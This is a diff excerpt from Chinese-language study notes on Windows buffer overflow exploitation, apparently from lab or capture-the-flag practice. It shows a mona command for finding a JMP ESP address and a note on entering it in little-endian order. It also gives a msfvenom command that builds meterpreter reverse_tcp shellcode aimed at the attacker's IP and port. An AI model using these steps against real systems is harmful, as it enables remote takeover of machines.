@@ -967,7 +967,10 @@ get下载下来(使用binary二进制模式下载，不然运行会出问题)
 接下来寻找跳跃点JMP：
 使用!mona jmp -r esp -cpb "\x00\x0a"
 cpb后跟我们找到的坏字符：
-
+![[Pasted image 20240310225227.png]]
+Results后跟的地址就是我们所需的JMP
+随便挑选一个，以小端序(和显示的地址反过来)填入脚本的retn部分：
+![[Pasted image 20240310225434.png]]
 接下来使用msfvenom生成我们所需的shellcode
 -b选项剔除了我们不需要的坏字符，这里生成的是meterpretershell
 `msfvenom -p windows/meterpreter/reverse_tcp -f c -b "\x00\x0a" LHOST=攻击机IP LPORT=攻击机端口`
